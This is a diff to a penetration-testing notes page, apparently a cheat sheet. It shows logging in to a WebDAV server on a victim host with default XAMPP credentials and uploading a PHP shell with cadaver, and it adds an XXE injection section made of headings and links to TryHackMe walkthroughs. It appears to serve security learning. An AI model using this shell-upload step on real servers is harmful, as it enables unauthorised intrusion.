@@ -258,9 +258,31 @@ If server is using WebDav and we have credentials we can login and upload files.
 
 <pre><code><strong>cadaver http://$VICTIM:80/webdav
 </strong>Username: wampp
-Password: xampp
-dav:/webdav/> put shell.php shell.php
+<strong>Password: xampp
+</strong>dav:/webdav/> put shell.php shell.php
 </code></pre>
+
+
+
+## XXE Injection
+
+### Exploiting XXE - In-Band
+
+**Examples**
+
+[#exploiting-xxe-in-band](../../walkthroughs/tryhackme/xxe-injection.md#exploiting-xxe-in-band "mention")
+
+### Exploiting XXE - Out-of-Band
+
+**Examples**
+
+[#exploiting-xxe-out-of-band](../../walkthroughs/tryhackme/xxe-injection.md#exploiting-xxe-out-of-band "mention")
+
+### SSRF + XXE
+
+**Examples**
+
+[#ssrf--xxe](../../walkthroughs/tryhackme/xxe-injection.md#ssrf--xxe "mention")
 
 
 
